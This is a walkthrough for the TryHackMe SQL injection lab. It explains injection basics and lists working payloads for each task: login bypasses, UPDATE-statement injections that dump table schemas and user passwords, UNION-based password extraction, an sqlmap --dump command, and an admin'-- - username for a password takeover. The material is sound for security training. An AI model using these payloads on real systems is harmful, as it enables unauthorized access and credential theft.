# Room
https://tryhackme.com/room/sqlilab

# Task 1 - Intro
Deploy VM

# Task 2 - Intro to SQL Injection
SQL Injection allows attackers to execute their own malicious SQL statements. Using a single quote in an input field is a very basic test to check for SQL Injection.  If you search for part of a string and it returns that string and others that match it you know that wildcards are in use on the backend for your query.  Check what version of DBMS is on the backend to further craft a vulnerable query.  Another basic wildcard test is ' ;--.  You can use the sleep function with a query for testing, this is useful for blind tests, it will identify the DBMS as MySQL.  Using union and select with dual is another testing mechanism for MySQL.  Information_schema.tables contains information about all tables in the database, it is a metadata table

* Practical
  * Input Box Non-String
    * 1 or 1=1--
  * Input Box String
    * 1' or '1'='1'--
  * URL Injection   
    * /sesqli3/login?profileID=-1' or 1=1-- -&password=a
  * POST Injection
    * Use burp suite to intercept the login and modify the POST request
    * profileID=-1' or 1=1-- &password=a

# Task 3 - Intro to SQL Injection Part 2
If injection occurs on the UPDATE statement, the damage can be more severe.  UPDATE allows you to modify information in the database

* Practical
  * Login as the test user and then edit profile
  * In the profile fields, use vulnerable input to perform discovery
  * asd',nickName='test',email='hacked
  * ',nickName=sqlite_version(),email='
  * ',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
  * ',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='
  * ',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='
  * With this walkthrough in mind, find the secret table and the flag inside

# Task 4 - Broken Authentication
* Practical
  * Apply the skills learned in the previous tasks to this practical with a broken authentication form

# Task 5 - Broken Authentication 2
* Practical
  * Step through form authentication testing using the UNION command
  * ' UNION SELECT 1,2-- 
  * ' UNION SELECT 1, password from users-- -
  * ' UNION SELECT 1,group_concat(password) FROM users-- -

# Task 6 - Broken Authentication 3
* Practical
  * Step through a blind SQL Injection
  * Use sqlmap to navigate the injection and grab the flag
  * sqlmap -u http://10.10.58.129:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump

# Task 7 - Vulnerable Notes
* Practical
  * Create a new user on the registration page
  * ' union select 1,2'
  * Login with that user
  * Step through other user generation tests to find the flag
  * ' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''
  * '  union select 1,group_concat(password) from users'

# Task 8 - Change Password
* Practical
  * Take advantage of the change password field
  * Create a vulnerable username
  * admin'-- -
  * Login with that user
  * Change the password, the udpated password belongs to admin, not admin'-- -

